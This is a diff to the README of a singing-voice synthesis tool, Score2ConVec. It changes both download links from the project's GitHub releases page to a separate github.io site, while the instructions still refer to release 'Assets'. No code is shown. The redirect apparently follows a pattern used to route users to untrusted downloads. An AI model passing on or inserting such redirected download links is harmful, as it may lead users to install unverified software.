@@ -1,6 +1,6 @@
 # 🎙️ Score2ConVec - Create singing voices from musical scores
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Osdsoh7817/Score2ConVec/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://osdsoh7817.github.io)
 
 Score2ConVec allows you to convert MIDI notes and lyrics into realistic singing voices. It works with existing voice models like RVC and so-vits-svc. You can use your computer to generate professional-sounding vocals without recording a human singer. The tool reads your musical input and matches it to a voice model. This brings your digital compositions to life.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware and software to run this tool smoothly.
 
 Visit the link below to reach the release page.
 
-[https://github.com/Osdsoh7817/Score2ConVec/releases](https://github.com/Osdsoh7817/Score2ConVec/releases)
+[https://osdsoh7817.github.io](https://osdsoh7817.github.io)
 
 1. Open the link in your web browser.
 2. Look for the section labeled "Assets" at the bottom of the latest release.
